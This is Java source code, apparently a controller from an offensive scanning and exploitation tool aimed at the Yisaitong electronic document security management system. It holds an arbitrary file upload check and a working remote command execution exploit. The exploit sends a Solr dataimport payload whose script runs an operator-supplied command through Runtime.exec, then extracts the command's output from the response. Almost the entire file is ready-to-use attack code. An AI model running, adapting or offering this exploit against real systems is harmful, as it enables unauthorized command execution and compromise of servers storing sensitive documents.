package com.achuna33.Controllers;

import com.achuna33.SupportType.Poc_Exp;
import com.achuna33.SupportType.SupportVul;
import com.achuna33.Utils.Cache;
import com.achuna33.Utils.HttpRequest;
import com.achuna33.Utils.Response;

import java.io.ByteArrayInputStream;
import java.net.MalformedURLException;
import org.w3c.dom.Document;
import org.w3c.dom.Element;
import org.w3c.dom.Node;
import org.w3c.dom.NodeList;

import javax.xml.parsers.DocumentBuilder;
import javax.xml.parsers.DocumentBuilderFactory;


@BasicMapping(uri = "亿赛通")
public class YiSaitongController extends Controller implements BasicController{
    @VulnerabilityDescriptionMapping(Description = "亿赛通电子文档安全管理系统 UploadFileFromClientServiceForClient 任意文件上传漏洞",SupportVulType = SupportVul.UploadFile)
    public void vul_UploadFile(Poc_Exp type, String target, Object... args) throws MalformedURLException {
        WriteLog("\n[*] 开始检测：  亿赛通电子文档安全管理系统 UploadFileFromClientServiceForClient 任意文件上传漏洞");
        String url = "/CDGServer3/UploadFileFromClientServiceForClient?AFMALANMJCEOENIBDJMKFHBANGEPKHNOFJBMIFJPFNKFOKHJNMLCOIDDJGNEIPOLOKGAFAFJHDEJPHEPLFJHDGPBNELNFIICGFNGEOEFBKCDDCGJEPIKFHJFAOOHJEPNNCLFHDAFDNCGBAEELJFFHABJPDPIEEMIBOECDMDLEPBJGBGCGLEMBDFAGOGM";
        switch (type){
            case POC:
                HttpRequest httpRequest = new HttpRequest(target+url);
                Response result = httpRequest.Post("Test");
                if (result.statusCode == 200){
                    WriteLog("\n[*] 存在漏洞");
                    WriteLog("\n[*] 漏洞链接："+target+"tttT.jsp");
                }else {
                    WriteLog("\n[*] 不存在漏洞");
                }
            case EXP:
        }
    }

    @VulnerabilityDescriptionMapping(Description = "亿赛通电子文档安全管理系统 dataimport 命令执行漏洞",SupportVulType = SupportVul.RuntimeExec)
    public void vul_dataimport(Poc_Exp type, String target, Object... args) throws MalformedURLException {
        WriteLog("\n[*] 开始检测：  亿赛通电子文档安全管理系统 dataimport 命令执行漏洞");
        String command = Cache.uiController.exCommandText.getText();
        String url = "/solr/flow/dataimport?command=full-import&verbose=false&clean=false&commit=false&debug=true&core=tika&name=dataimport&dataConfig=%0A%3CdataConfig%3E%0A%3CdataSource%20name%3D%22streamsrc%22%20type%3D%22ContentStreamDataSource%22%20loggerLevel%3D%22TRACE%22%20%2F%3E%0A%0A%20%20%3Cscript%3E%3C!%5BCDATA%5B%0A%20%20%20%20%20%20%20%20%20%20function%20poc(row)%7B%0A%20var%20bufReader%20%3D%20new%20java.io.BufferedReader(new%20java.io.InputStreamReader(java.lang.Runtime.getRuntime().exec(%22"+command+"%22).getInputStream()))%3B%0A%0Avar%20result%20%3D%20%5B%5D%3B%0A%0Awhile(true)%20%7B%0Avar%20oneline%20%3D%20bufReader.readLine()%3B%0Aresult.push(%20oneline%20)%3B%0Aif(!oneline)%20break%3B%0A%7D%0A%0Arow.put(%22title%22%2Cresult.join(%22%5Cn%5Cr%22))%3B%0Areturn%20row%3B%0A%0A%7D%0A%0A%5D%5D%3E%3C%2Fscript%3E%0A%0A%3Cdocument%3E%0A%20%20%20%20%3Centity%0A%20%20%20%20%20%20%20%20stream%3D%22true%22%0A%20%20%20%20%20%20%20%20name%3D%22entity1%22%0A%20%20%20%20%20%20%20%20datasource%3D%22streamsrc1%22%0A%20%20%20%20%20%20%20%20processor%3D%22XPathEntityProcessor%22%0A%20%20%20%20%20%20%20%20rootEntity%3D%22true%22%0A%20%20%20%20%20%20%20%20forEach%3D%22%2FRDF%2Fitem%22%0A%20%20%20%20%20%20%20%20transformer%3D%22script%3Apoc%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cfield%20column%3D%22title%22%20xpath%3D%22%2FRDF%2Fitem%2Ftitle%22%20%2F%3E%0A%20%20%20%20%3C%2Fentity%3E%0A%3C%2Fdocument%3E%0A%3C%2FdataConfig%3E%0A%20%20%20%20%0A%20%20%20%20%20%20%20%20%20%20%20";
        String requestData = "    <RDF>\n        <item/>\n    </RDF>";

        switch (type){
            case POC:
                HttpRequest httpRequest = new HttpRequest(target+url);
                httpRequest.addHeaders("Accept","*/*");
                httpRequest.addHeaders("Content-Type", "application/xml");
                httpRequest.addHeaders("Content-Length","40");
                Response result = httpRequest.Post(requestData);

                if (result.statusCode == 200 && result.responseBody.contains("xml version=\"1.0")){
                    try {
                        DocumentBuilder builder = DocumentBuilderFactory.newInstance().newDocumentBuilder();
                        ByteArrayInputStream input = new ByteArrayInputStream(result.responseBody.getBytes("UTF-8"));
                        Document document = builder.parse(input);
                        // 提取命令执行的内容
                        NodeList nodeList = document.getElementsByTagName("arr");

                        for (int i = 0; i < nodeList.getLength(); i++) {
                            Element element = (Element) nodeList.item(i);
                            if ("title".equals(element.getAttribute("name"))) {
                                Node strNode = element.getElementsByTagName("str").item(0);
                                String content = strNode.getTextContent().trim();
                                WriteLog("\n 命令："+content);
                                WriteExpLog("[*] "+content);
                            }
                        }
                    } catch (Exception e) {
                        e.printStackTrace();
                    }
                    WriteLog("\n[*] 存在漏洞");

                    WriteLog("\n[*] 切换到命令执行模块执行其他命令");

                }else {
                    WriteLog("\n[*] 不存在漏洞");
                }
            case EXP:
        }
    }

}
